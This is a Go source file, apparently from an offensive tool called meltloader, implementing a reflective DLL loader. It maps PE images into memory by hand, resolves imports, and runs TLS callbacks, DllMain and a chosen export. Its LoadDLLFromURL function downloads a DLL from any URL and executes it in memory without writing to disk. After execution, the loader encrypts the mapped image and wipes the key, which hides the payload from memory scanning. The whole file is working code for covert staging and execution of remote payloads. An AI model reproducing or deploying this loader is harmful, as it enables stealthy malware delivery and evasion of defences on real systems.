package pe

import (
    "encoding/binary"
    "fmt"
    "log"
    "strconv"
    "io/ioutil"
    "unsafe"
    "sync"
    "os"
    "path/filepath"
    "strings"
    "github.com/carved4/meltloader/pkg/net"
    "github.com/carved4/meltloader/pkg/enc"
    api "github.com/carved4/go-wincall"
)

type DLLMapping struct {
	BaseAddress uintptr
	Size        uintptr
}

var (
	dllRegistry = make(map[uintptr]*DLLMapping)
	registryMutex sync.RWMutex
)


func createDLLMapping(baseAddress uintptr, size uintptr) *DLLMapping {
	mapping := &DLLMapping{
		BaseAddress: baseAddress,
		Size:        size,
	}
	
	registryMutex.Lock()
	dllRegistry[baseAddress] = mapping
	registryMutex.Unlock()
	
	return mapping
}

func unregisterDLL(baseAddress uintptr) {
	registryMutex.Lock()
	delete(dllRegistry, baseAddress)
	registryMutex.Unlock()
}


func uintptrToBytes(ptr uintptr) []byte {
	ptrPtr := unsafe.Pointer(&ptr)

	byteSlice := make([]byte, unsafe.Sizeof(ptr))
	for i := 0; i < int(unsafe.Sizeof(ptr)); i++ {
		byteSlice[i] = *(*byte)(unsafe.Pointer(uintptr(ptrPtr) + uintptr(i)))
	}

	return byteSlice
}

func bytePtrToString(ptr *byte) string {
    if ptr == nil {
        return ""
    }
    
    var result []byte
    for i := uintptr(0); ; i++ {
        b := *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(ptr)) + i))
        if b == 0 {
            break
        }
        result = append(result, b)
    }
    
    return string(result)
}

func LoadDLLFromFile(filePath string, functionIdentifier interface{}) (*DLLMapping, error) {
    // If a raw name or relative path is given, resolve it against current working directory.
    if !filepath.IsAbs(filePath) {
        wd, werr := os.Getwd()
        if werr != nil {
            return nil, fmt.Errorf("[ERROR] could not get working directory: %v", werr)
        }
        candidate := filepath.Join(wd, filePath)
        if _, statErr := os.Stat(candidate); statErr != nil {
            return nil, fmt.Errorf("[ERROR] DLL not found in current directory: %s", filePath)
        }
        filePath = candidate
    }

    dllBytes, err := ioutil.ReadFile(filePath)
    if err != nil {
        return nil, fmt.Errorf("[ERROR] failed to read DLL file: %v", err)
    }
    return LoadDLL(dllBytes, functionIdentifier)
}


func LoadDLL(dllBytes []byte, functionIdentifier interface{}) (*DLLMapping, error) {
    dllPtr := uintptr(unsafe.Pointer(&dllBytes[0]))

	if len(dllBytes) < 64 {
		return nil, fmt.Errorf("[ERROR] DLL file too small (less than 64 bytes)")
	}

	e_lfanew := *((*uint32)(unsafe.Pointer(dllPtr + 0x3c)))
	
	if e_lfanew >= uint32(len(dllBytes)) || e_lfanew < 64 {
		return nil, fmt.Errorf("[ERROR] Invalid e_lfanew offset: 0x%X", e_lfanew)
	}
	
	nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(dllPtr + uintptr(e_lfanew)))
	
	if nt_header.Signature != 0x4550 {
		return nil, fmt.Errorf("[ERROR] Invalid PE signature: 0x%X", nt_header.Signature)
	}

	preferredBase := uintptr(nt_header.OptionalHeader.ImageBase)
	regionSize := uintptr(nt_header.OptionalHeader.SizeOfImage)
	
	// generate encryption key for the mapped DLL
	encKey, err := enc.GenerateKey(32)
	if err != nil {
		return nil, fmt.Errorf("[ERROR] failed to generate encryption key: %v", err)
	}
	
	dllBase := preferredBase
	status, err := api.NtAllocateVirtualMemory(^uintptr(0), &dllBase, 0, &regionSize, 
		MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE)
	
	if err != nil || status != 0 {
		dllBase = 0 
		regionSize = uintptr(nt_header.OptionalHeader.SizeOfImage)
		status, err = api.NtAllocateVirtualMemory(^uintptr(0), &dllBase, 0, &regionSize, 
			MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE)
		if err != nil || status != 0 {
			return nil, fmt.Errorf("[ERROR] NtAllocateVirtualMemory Failed: status=0x%X, err=%v", status, err)
		}
	}
	
	// defer encryption of the mapped DLL after execution
	defer func() {
		// create a byte slice that points to the mapped DLL memory
		mappedDLL := (*[1 << 30]byte)(unsafe.Pointer(dllBase))[:regionSize:regionSize]
		enc.EncryptBuffer(&mappedDLL, encKey)
		enc.SecureWipeBuffer(&encKey) // wipe the encryption key from memory
	}()

	var numberOfBytesWritten uintptr
	status, err = api.NtWriteVirtualMemory(^uintptr(0), dllBase, uintptr(unsafe.Pointer(&dllBytes[0])), uintptr(nt_header.OptionalHeader.SizeOfHeaders), &numberOfBytesWritten)
	if err != nil || status != 0 {
		log.Fatalf("[ERROR] NtWriteVirtualMemory Failed: status=0x%X, err=%v", status, err)
	}
	numberOfSections := int(nt_header.FileHeader.NumberOfSections)

	var sectionAddr uintptr
	sectionAddr = dllPtr + uintptr(e_lfanew) + unsafe.Sizeof(nt_header.Signature) + unsafe.Sizeof(nt_header.OptionalHeader) + unsafe.Sizeof(nt_header.FileHeader)

	for i := 0; i < numberOfSections; i++ {
		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(sectionAddr))
		sectionDestination := dllBase + uintptr(section.VirtualAddress)
		sectionBytes := (*byte)(unsafe.Pointer(dllPtr + uintptr(section.PointerToRawData)))

		// Copy initialized data
		if section.SizeOfRawData > 0 {
			status, err = api.NtWriteVirtualMemory(^uintptr(0), sectionDestination, uintptr(unsafe.Pointer(sectionBytes)), uintptr(section.SizeOfRawData), &numberOfBytesWritten)
			if err != nil || status != 0 {
				log.Fatalf("[ERROR] NtWriteVirtualMemory Failed: status=0x%X, err=%v", status, err)
			}
		}
		// Zero the remaining VirtualSize for .bss (if any)
		if section.VirtualSize > section.SizeOfRawData {
			zeroStart := sectionDestination + uintptr(section.SizeOfRawData)
			zeroSize := uintptr(section.VirtualSize - section.SizeOfRawData)
			// Create zeroed buffer on the fly in chunks to avoid huge allocs (simple approach here)
			const chunk = 0x1000
			var written uintptr
			for zeroSize > 0 {
				n := zeroSize
				if n > chunk {
					n = chunk
				}
				// Reuse a static zero page by allocating once
				var zeroPage [chunk]byte
				status, err = api.NtWriteVirtualMemory(^uintptr(0), zeroStart, uintptr(unsafe.Pointer(&zeroPage[0])), n, &written)
				if err != nil || status != 0 {
					log.Fatalf("[ERROR] NtWriteVirtualMemory (zero) Failed: status=0x%X, err=%v", status, err)
				}
				zeroStart += n
				zeroSize -= n
			}
		}
		sectionAddr += unsafe.Sizeof(*section)
	}

	deltaImageBase := dllBase - preferredBase
	if deltaImageBase != 0 {
		relocations := nt_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
		if relocations.VirtualAddress == 0 || relocations.Size == 0 {
			return nil, fmt.Errorf("[ERROR] DLL loaded at different base address but no relocation table found")
		}
		
		relocation_table := dllBase + uintptr(relocations.VirtualAddress)
		var relocations_processed int = 0
		
		for relocations_processed < int(relocations.Size) {
			relocation_block := *(*BASE_RELOCATION_BLOCK)(unsafe.Pointer(relocation_table + uintptr(relocations_processed)))
			
			if relocation_block.BlockSize == 0 || relocation_block.BlockSize < 8 {
				break
			}
			
			relocEntry := relocation_table + uintptr(relocations_processed) + 8
			relocationsCount := (relocation_block.BlockSize - 8) / 2

			for i := 0; i < int(relocationsCount); i++ {
				relocationEntry := *(*BASE_RELOCATION_ENTRY)(unsafe.Pointer(relocEntry + uintptr(i*2)))
				
				if relocationEntry.Type() == 0 {
					continue
				}
				if relocationEntry.Type() != 10 {
					continue
				}
				
				relocationRVA := relocation_block.PageAddress + uint32(relocationEntry.Offset())
				addressLocation := dllBase + uintptr(relocationRVA)
				var currentValue uint64
				byteSlice := make([]byte, 8)
				status, err := api.NtReadVirtualMemory(^uintptr(0), addressLocation, uintptr(unsafe.Pointer(&byteSlice[0])), 8, nil)
				if err != nil || status != 0 {
					return nil, fmt.Errorf("[ERROR] Failed to read relocation at RVA 0x%X: status=0x%X, err=%v", relocationRVA, status, err)
				}
				
				currentValue = binary.LittleEndian.Uint64(byteSlice)
				newValue := currentValue + uint64(deltaImageBase)
				binary.LittleEndian.PutUint64(byteSlice, newValue)
				status, err = api.NtWriteVirtualMemory(^uintptr(0), addressLocation, uintptr(unsafe.Pointer(&byteSlice[0])), 8, nil)
				if err != nil || status != 0 {
					return nil, fmt.Errorf("[ERROR] Failed to write relocation at RVA 0x%X: status=0x%X, err=%v", relocationRVA, status, err)
				}
			}
			
			relocations_processed += int(relocation_block.BlockSize)
		}
	}
    // Resolve imports using INT (OriginalFirstThunk) when present, writing into IAT (FirstThunk)
    importsDirectory := nt_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
    if importsDirectory.VirtualAddress != 0 {
    importDescriptorAddr := dllBase + uintptr(importsDirectory.VirtualAddress)
    for {
        importDescriptor := *(*IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(importDescriptorAddr))
        if importDescriptor.Name == 0 {
            break
        }
        libraryName := uintptr(importDescriptor.Name) + dllBase
        dllName := bytePtrToString((*byte)(unsafe.Pointer(libraryName)))
        // Use LoadLibraryA: import names are ANSI in the table
        dllNameBytes := append([]byte(dllName), 0)
        hLibrary, _ := api.Call("kernel32.dll", "LoadLibraryA", uintptr(unsafe.Pointer(&dllNameBytes[0])))
        if hLibrary == 0 {
            log.Fatalf("[ERROR] LoadLibrary Failed for: %s", dllName)
        }
        intAddr := dllBase + uintptr(importDescriptor.OriginalFirstThunk)
        iatAddr := dllBase + uintptr(importDescriptor.FirstThunk)
        for {
            var lookup uint64
            if importDescriptor.OriginalFirstThunk != 0 {
                lookup = *(*uint64)(unsafe.Pointer(intAddr))
            } else {
                lookup = *(*uint64)(unsafe.Pointer(iatAddr))
            }
            if lookup == 0 {
                break
            }
            var proc uintptr
            var perr error
            if (lookup & 0x8000000000000000) != 0 {
                // Import by ordinal: pass ordinal value as LPCSTR using MAKEINTRESOURCEA semantics
                ordinal := lookup & 0xFFFF
                proc, perr = api.Call("kernel32.dll", "GetProcAddress", hLibrary, uintptr(ordinal))
            } else {
                functionNameAddr := dllBase + uintptr(lookup+2)
                functionName := bytePtrToString((*byte)(unsafe.Pointer(functionNameAddr)))
                functionNameBytes := append([]byte(functionName), 0)
                proc, perr = api.Call("kernel32.dll", "GetProcAddress", hLibrary, uintptr(unsafe.Pointer(&functionNameBytes[0])))
                if (perr != nil || proc == 0) && functionName != "" {
                    // If GetProcAddress failed, check if this is a forwarded export by name
                    if fwdAddr, ok := checkForwardedExportByName(unsafe.Pointer(hLibrary), functionName); ok {
                        fwdStr := cstringAt(fwdAddr)
                        realProc, rerr := resolveForwardedExport(fwdStr)
                        if rerr == nil && realProc != 0 {
                            proc = realProc
                            perr = nil
                        }
                    }
                }
            }
            if perr != nil || proc == 0 {
                log.Fatalf("[ERROR] Failed to GetProcAddress for %s (lookup=0x%X) err=%v", dllName, lookup, perr)
            }
            // If the proc points inside the export directory, it's a forwarder string
            if isForwardedExport(unsafe.Pointer(hLibrary), proc) {
                fwdStr := cstringAt(proc)
                realProc, rerr := resolveForwardedExport(fwdStr)
                if rerr != nil || realProc == 0 {
                    log.Fatalf("[ERROR] Failed to resolve forwarded export %s from %s: %v", fwdStr, dllName, rerr)
                }
                proc = realProc
            }
            procBytes := uintptrToBytes(proc)
            var numberOfBytesWritten uintptr
            status, err := api.NtWriteVirtualMemory(^uintptr(0), iatAddr, uintptr(unsafe.Pointer(&procBytes[0])), uintptr(len(procBytes)), &numberOfBytesWritten)
            if err != nil || status != 0 {
                log.Fatalf("[ERROR] NtWriteVirtualMemory(IAT) Failed: status=0x%X, err=%v", status, err)
            }
            if importDescriptor.OriginalFirstThunk != 0 { intAddr += 0x8 }
            iatAddr += 0x8
        }
        importDescriptorAddr += 0x14
    }
    }

    // Set proper protections: headers R, .text RX, .rdata R, .data/.pdata RW, etc.
    // Protect headers as read-only
    {
        base := dllBase
        size := uintptr(nt_header.OptionalHeader.SizeOfHeaders)
        var oldProt uintptr
        status, err = api.NtProtectVirtualMemory(^uintptr(0), &base, &size, PAGE_READONLY, &oldProt)
        if err != nil || status != 0 {
            log.Fatalf("[ERROR] NtProtectVirtualMemory (headers) Failed: status=0x%X, err=%v", status, err)
        }
    }
    // Section flag masks
    const (
        IMAGE_SCN_MEM_EXECUTE = 0x20000000
        IMAGE_SCN_MEM_READ    = 0x40000000
        IMAGE_SCN_MEM_WRITE   = 0x80000000
    )
    // Iterate sections and set per-section protection
    {
        numberOfSections := int(nt_header.FileHeader.NumberOfSections)
        sectionAddr := dllPtr + uintptr(e_lfanew) + unsafe.Sizeof(nt_header.Signature) + unsafe.Sizeof(nt_header.OptionalHeader) + unsafe.Sizeof(nt_header.FileHeader)
        for i := 0; i < numberOfSections; i++ {
            section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(sectionAddr))
            if section.VirtualSize == 0 {
                sectionAddr += unsafe.Sizeof(*section)
                continue
            }
            secBase := dllBase + uintptr(section.VirtualAddress)
            secSize := uintptr(section.VirtualSize)
            // Round up to page size implicitly handled by NtProtectVirtualMemory
            var prot uint32 = PAGE_READONLY
            flags := section.Characteristics
            if (flags & IMAGE_SCN_MEM_WRITE) != 0 {
                prot = PAGE_READWRITE
            } else if (flags & IMAGE_SCN_MEM_EXECUTE) != 0 {
                prot = PAGE_EXECUTE_READ
            } else if (flags & IMAGE_SCN_MEM_READ) != 0 {
                prot = PAGE_READONLY
            }
            base := secBase
            size := secSize
            var oldProt uintptr
            status, err = api.NtProtectVirtualMemory(^uintptr(0), &base, &size, uintptr(prot), &oldProt)
            if err != nil || status != 0 {
                log.Fatalf("[ERROR] NtProtectVirtualMemory (section %d) Failed: status=0x%X, err=%v", i, status, err)
            }
            sectionAddr += unsafe.Sizeof(*section)
        }
    }

    // Determine if caller requested export-only invocation via special prefix.
    exportOnly := false
    if s, ok := functionIdentifier.(string); ok {
        if strings.HasPrefix(s, "export_only:") {
            exportOnly = true
            functionIdentifier = strings.TrimPrefix(s, "export_only:")
        }
    }

    // Run TLS callbacks (if present) before DllMain
    {
        tlsDir := nt_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]
        if tlsDir.VirtualAddress != 0 && tlsDir.Size >= uint32(unsafe.Sizeof(IMAGE_TLS_DIRECTORY64{})) {
            tls := (*IMAGE_TLS_DIRECTORY64)(unsafe.Pointer(dllBase + uintptr(tlsDir.VirtualAddress)))
            callbackArray := uintptr(tls.AddressOfCallBacks)
            for callbackArray != 0 {
                cb := *(*uintptr)(unsafe.Pointer(callbackArray))
                if cb == 0 { break }
                api.CallG0(cb, dllBase, DLL_PROCESS_ATTACH, 0)
                callbackArray += unsafe.Sizeof(uintptr(0))
            }
        }
    }
    // Call module entry (DllMainCRTStartup) with DLL_PROCESS_ATTACH unless export-only was requested
    if !exportOnly {
        entry := dllBase + uintptr(nt_header.OptionalHeader.AddressOfEntryPoint)
        api.CallG0(entry, dllBase, DLL_PROCESS_ATTACH, 0)
    }

    exportsDirectory := nt_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
    if exportsDirectory.VirtualAddress != 0 {
        exportTable := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(dllBase + uintptr(exportsDirectory.VirtualAddress)))
        functionRVAs := (*[1000]uint32)(unsafe.Pointer(dllBase + uintptr(exportTable.AddressOfFunctions)))
        nameRVAs := (*[1000]uint32)(unsafe.Pointer(dllBase + uintptr(exportTable.AddressOfNames)))
        nameOrdinals := (*[1000]uint16)(unsafe.Pointer(dllBase + uintptr(exportTable.AddressOfNameOrdinals)))

        var functionRVA uint32
        var found bool

        switch v := functionIdentifier.(type) {
        case string:
            for i := uint32(0); i < exportTable.NumberOfNames; i++ {
                nameAddr := dllBase + uintptr(nameRVAs[i])
                funcName := bytePtrToString((*byte)(unsafe.Pointer(nameAddr)))
                if funcName == v {
                    functionRVA = functionRVAs[nameOrdinals[i]]
                    found = true
                    break
                }
            }
        case int:
            ordinalIndex := uint32(v) - exportTable.Base
            if ordinalIndex < exportTable.NumberOfFunctions {
                functionRVA = functionRVAs[ordinalIndex]
                found = true
            }
        default:
            if str, ok := functionIdentifier.(string); ok {
                if num, err := strconv.Atoi(str); err == nil {
                    ordinalIndex := uint32(num) - exportTable.Base
                    if ordinalIndex < exportTable.NumberOfFunctions {
                        functionRVA = functionRVAs[ordinalIndex]
                        found = true
                    }
                } else {
                    for i := uint32(0); i < exportTable.NumberOfNames; i++ {
                        nameAddr := dllBase + uintptr(nameRVAs[i])
                        funcName := bytePtrToString((*byte)(unsafe.Pointer(nameAddr)))
                        if funcName == str {
                            functionRVA = functionRVAs[nameOrdinals[i]]
                            found = true
                            break
                        }
                    }
                }
            }
        }

        if found && functionRVA != 0 {
            funcVA := dllBase + uintptr(functionRVA)
            exportStart := dllBase + uintptr(exportsDirectory.VirtualAddress)
            exportEnd := exportStart + uintptr(exportsDirectory.Size)
            if funcVA >= exportStart && funcVA < exportEnd {
                // Forwarded export string inside export directory
                fwdStr := bytePtrToString((*byte)(unsafe.Pointer(funcVA)))
                realProc, rerr := resolveForwardedExport(fwdStr)
                if rerr != nil || realProc == 0 {
                    log.Fatalf("[ERROR] Failed to resolve forwarded export %s: %v", fwdStr, rerr)
                }
                api.CallG0(realProc)
            } else {
                api.CallG0(funcVA)
            }
        } else {
        }
    }
    mapping := createDLLMapping(dllBase, uintptr(nt_header.OptionalHeader.SizeOfImage))
    
    return mapping, nil
}



func Melt(mapping *DLLMapping) error {
	if mapping == nil {
		return fmt.Errorf("[ERROR] Invalid mapping provided")
	}
	
	result, err := api.Call("kernel32.dll", "VirtualFree", mapping.BaseAddress, uintptr(0), uintptr(0x8000))
	if err != nil {
		return fmt.Errorf("[ERROR] VirtualFree failed: %v", err)
	}
	
	if result == 0 {
		return fmt.Errorf("[ERROR] VirtualFree returned 0 (failure)")
	}
	unregisterDLL(mapping.BaseAddress)
	
	return nil
}


// returns: slice of base addresses, slice of sizes, and total count of mapped DLLs
func GetMap() ([]uintptr, []uintptr, int) {
	registryMutex.RLock()
	defer registryMutex.RUnlock()
	
	count := len(dllRegistry)
	baseAddresses := make([]uintptr, 0, count)
	sizes := make([]uintptr, 0, count)
	
	for _, mapping := range dllRegistry {
		baseAddresses = append(baseAddresses, mapping.BaseAddress)
		sizes = append(sizes, mapping.Size)
	}
	
	return baseAddresses, sizes, count
}

func LoadDLLFromURL(url string, functionIdentifier interface{}, sleep ...int) (*DLLMapping, error) {
	buff, err := net.DownloadToMemory(url)
	if err != nil {
		return nil, fmt.Errorf("[ERROR] failed to download DLL from URL: %v", err)
	}
	key, err := enc.GenerateKey(32)
	if err != nil {
		return nil, fmt.Errorf("[ERROR] failed to generate key: %v", err)
	}
	
	// default sleep value is 0 if not provided
	sleepTime := 0
	if len(sleep) > 0 {
		sleepTime = sleep[0]
	}
	
	enc.EncryptDecryptBuffer(&buff, key, sleepTime)
	
	return LoadDLL(buff, functionIdentifier)
}
